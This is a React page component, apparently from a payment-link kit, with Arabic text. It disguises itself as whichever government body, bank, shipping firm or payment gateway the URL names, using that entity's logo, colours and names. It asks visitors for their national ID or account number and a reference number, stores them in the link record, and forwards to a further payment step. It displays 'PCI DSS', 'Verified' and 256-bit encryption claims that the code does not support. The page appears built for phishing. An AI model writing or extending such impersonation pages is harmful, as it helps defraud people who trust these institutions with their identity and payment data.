import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import {
  FileText,
  Loader2,
  ShieldCheck,
  ArrowLeft,
  Lock,
  Landmark,
  Info,
  CheckCircle,
  AlertCircle,
  Building2,
  Truck,
  CreditCard,
  Wallet,
  Shield
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { formatCurrency } from "@/lib/countryCurrencies";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";
import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: link, isLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [reference, setReference] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Detect entity from URL params or link data
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || link?.payload?.service_key || '';
  const countryCode = link?.country_code || "SA";
  const govSystem = getGovernmentPaymentSystem(countryCode);

  // Fallback: if no serviceKey, use government payment system by country
  const effectiveServiceKey = serviceKey || `gov_${countryCode.toLowerCase()}`;

  // Get entity visual spec
  const entitySpec = useMemo(() => {
    return getEntityVisualSpec(effectiveServiceKey);
  }, [effectiveServiceKey]);

  // Get branding as fallback
  const serviceBranding = getServiceBranding(effectiveServiceKey);
  const companyBranding = shippingCompanyBranding[effectiveServiceKey.toLowerCase()] || null;

  // Apply entity CSS variables
  useEffect(() => {
    if (entitySpec) {
      const cssVars = specToCSSVariables(entitySpec);
      const root = document.documentElement;
      Object.entries(cssVars).forEach(([key, value]) => {
        root.style.setProperty(key, value);
      });
      root.setAttribute('data-entity', entitySpec.entityId);
      root.setAttribute('data-entity-category', entitySpec.category);
    }
    return () => {
      // Cleanup on unmount
      const root = document.documentElement;
      root.removeAttribute('data-entity');
      root.removeAttribute('data-entity-category');
    };
  }, [entitySpec]);

  useEffect(() => {
    if (link?.payload?.reference) {
      setReference(link.payload.reference);
    }
  }, [link]);

  // Determine visual config
  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary || govSystem.colors.primary;
  const secondaryColor = entitySpec?.colors.secondary || companyBranding?.colors.secondary || serviceBranding.colors.secondary || govSystem.colors.secondary;
  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8F9FA';
  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || '#1A1A1A';
  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || govSystem.fonts.primaryAr;
  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
  const inputHeight = entitySpec?.dimensions.inputHeight || '52px';
  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 10px 40px rgba(0,0,0,0.1)';
  const buttonShadow = entitySpec?.shadows.button || `0 8px 24px ${primaryColor}40`;
  const logoUrl = entitySpec?.assets.logo || companyBranding?.logoUrl || '';
  const entityNameAr = entitySpec?.entityNameAr || serviceBranding.nameAr || govSystem.nameAr;
  const entityNameEn = entitySpec?.entityNameEn || serviceBranding.nameEn || govSystem.nameEn;
  const category = entitySpec?.category || 'government';

  // Determine page title and description based on entity
  const pageTitle = category === 'shipping' || category === 'postal' ? 'بيانات الشحنة' :
                    category === 'bank' ? 'بيانات الحساب' :
                    category === 'payment_gateway' ? `بوابة ${entityNameAr}` :
                    'الاستعلام عن المستحقات';
  const pageDescription = category === 'shipping' || category === 'postal' ? 'أدخل بيانات الشحنة للمتابعة إلى الدفع' :
                          category === 'bank' ? 'أدخل بيانات الحساب للمتابعة' :
                          category === 'payment_gateway' ? `أدخل بياناتك للسداد عبر ${entityNameAr}` :
                          'يرجى إدخال بيانات الهوية ومرجع الخدمة للتحقق';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!reference || !nationalId) {
      toast({ title: "تنبيه", description: "يرجى تعبئة كافة الحقول المطلوبة للمتابعة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: { ...link?.payload, reference, nationalId }
        });
      }

      navigate(`/pay/${id}/recipient${window.location.search}`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isLoading || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor }}>
        <Loader2 className="w-10 h-10 animate-spin" style={{ color: primaryColor }} />
      </div>
    );
  }

  // Get entity icon based on category
  const EntityIcon = category === 'shipping' || category === 'postal' ? Truck :
                     category === 'bank' ? Landmark :
                     category === 'payment_gateway' ? CreditCard :
                     Shield;

  return (
    <div className="min-h-screen pb-20" dir="rtl" style={{ backgroundColor, fontFamily }}>
      {/* Entity-Specific Header */}
      <header className="border-b sticky top-0 z-50" style={{ backgroundColor: surfaceColor, borderColor, boxShadow: entitySpec?.shadows.header || '0 2px 8px rgba(0,0,0,0.06)' }}>
        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <BackButton />
            {logoUrl ? (
              <img src={logoUrl} alt={entityNameAr} className="h-8 sm:h-10 w-auto object-contain" />
            ) : (
              <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center text-white shadow-lg" style={{ background: primaryColor }}>
                <EntityIcon className="w-5 h-5 sm:w-6 sm:h-6" />
              </div>
            )}
            <div>
              <h1 className="text-base sm:text-xl font-bold" style={{ color: textColor }}>{entityNameAr}</h1>
              <p className="text-[9px] sm:text-[10px] font-bold uppercase tracking-widest" style={{ color: textLightColor }}>{entityNameEn}</p>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8 sm:py-12">
        <div className="max-w-2xl mx-auto space-y-8 sm:space-y-10">
          {/* Page Title */}
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold" style={{ color: textColor }}>{pageTitle}</h2>
            <p className="text-sm sm:text-lg font-medium" style={{ color: textLightColor }}>{pageDescription}</p>
          </div>

          {/* Main Card */}
          <Card className="p-6 sm:p-10 border-0 relative overflow-hidden" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
            {/* Decorative element */}
            <div className="absolute top-0 right-0 w-24 h-24 sm:w-32 sm:h-32 opacity-[0.04] -mr-12 -mt-12 sm:-mr-16 sm:-mt-16 rounded-full" style={{ background: primaryColor }} />

            <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8 relative z-10">
              <div className="space-y-4 sm:space-y-6">
                <div className="space-y-2">
                  <Label className="text-xs font-bold uppercase tracking-wide" style={{ color: textLightColor }}>
                    {category === 'shipping' || category === 'postal' ? 'رقم الشحنة / التتبع' :
                     category === 'bank' ? 'رقم الحساب' :
                     'رقم الهوية الوطنية / الإقامة'}
                  </Label>
                  <Input
                    value={nationalId}
                    onChange={(e) => setNationalId(e.target.value)}
                    className="transition-all"
                    style={{
                      height: inputHeight,
                      borderRadius,
                      backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
                      borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
                      borderWidth: '2px',
                      fontSize: '18px',
                      fontWeight: 700,
                      textAlign: 'center',
                      letterSpacing: '0.15em',
                    }}
                    placeholder={category === 'shipping' || category === 'postal' ? 'أدخل رقم الشحنة' : 'XXXXXXXXXX'}
                    maxLength={category === 'shipping' || category === 'postal' ? undefined : 10}
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label className="text-xs font-bold uppercase tracking-wide" style={{ color: textLightColor }}>
                    {category === 'shipping' || category === 'postal' ? 'رقم المرجع / الفاتورة' :
                     category === 'bank' ? 'رقم المرجع' :
                     'رقم الفاتورة / المرجع'}
                  </Label>
                  <div className="relative group">
                    <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 transition-colors" style={{ color: textLightColor }} />
                    <Input
                      value={reference}
                      onChange={(e) => setReference(e.target.value)}
                      className="transition-all pr-12"
                      style={{
                        height: inputHeight,
                        borderRadius,
                        backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
                        borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
                        borderWidth: '2px',
                        fontSize: '16px',
                        fontWeight: 600,
                      }}
                      placeholder="أدخل الرقم المرجعي للخدمة"
                      required
                    />
                  </div>
                </div>
              </div>

              {/* Amount Display */}
              <div className="p-4 sm:p-6 rounded-2xl sm:rounded-3xl border space-y-3 sm:space-y-4" style={{ backgroundColor: `${primaryColor}08`, borderColor: `${primaryColor}20` }}>
                <div className="flex items-center gap-3">
                  <Info className="w-5 h-5" style={{ color: primaryColor }} />
                  <p className="text-sm font-bold" style={{ color: primaryColor }}>معلومات الفاتورة</p>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium" style={{ color: `${primaryColor}80` }}>المبلغ المستحق:</span>
                  <span className="text-xl sm:text-2xl font-bold" style={{ color: primaryColor }}>{formatCurrency(link.payload.payment_amount, link.payload.currency_code)}</span>
                </div>
              </div>

              {/* Submit Button */}
              <Button
                type="submit"
                disabled={isSubmitting}
                className="w-full text-lg sm:text-xl font-bold shadow-xl transition-all hover:translate-y-[-2px] active:translate-y-[1px]"
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                  boxShadow: buttonShadow,
                  borderRadius,
                  height: buttonHeight,
                  color: entitySpec?.colors.textOnPrimary || '#FFFFFF',
                }}
              >
                {isSubmitting ? <Loader2 className="w-6 h-6 sm:w-8 sm:h-8 animate-spin" /> : "تحقق ومتابعة السداد"}
              </Button>

              {/* Security Badges */}
              <div className="flex items-center justify-center gap-3 sm:gap-4 text-[9px] sm:text-[10px] font-bold uppercase" style={{ color: textLightColor }}>
                <div className="flex items-center gap-1"><Lock className="w-3 h-3" /> Encrypted</div>
                <div className="w-1 h-1 rounded-full" style={{ backgroundColor: borderColor }} />
                <div className="flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> PCI DSS</div>
                <div className="w-1 h-1 rounded-full" style={{ backgroundColor: borderColor }} />
                <div className="flex items-center gap-1"><CheckCircle className="w-3 h-3" /> Verified</div>
              </div>
            </form>
          </Card>

          {/* Security Notice */}
          <div className="p-6 sm:p-8 rounded-2xl sm:rounded-[2.5rem] text-white flex items-center gap-6 sm:gap-8 shadow-xl" style={{ backgroundColor: '#1E293B' }}>
            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-white/10 rounded-2xl flex items-center justify-center shrink-0 border border-white/20">
              <AlertCircle className="w-6 h-6 sm:w-8 sm:h-8 text-amber-400" />
            </div>
            <div>
              <h4 className="text-base sm:text-lg font-bold mb-1">تعليمات الأمن السيبراني</h4>
              <p className="text-xs opacity-60 font-medium leading-relaxed">
                تأكد دائماً من وجود علامة القفل في شريط العنوان. لا تشارك بياناتك البنكية مع أي روابط غير رسمية. هذه البوابة مشفرة بمعيار 256-bit.
              </p>
            </div>
          </div>
        </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default PaymentData;
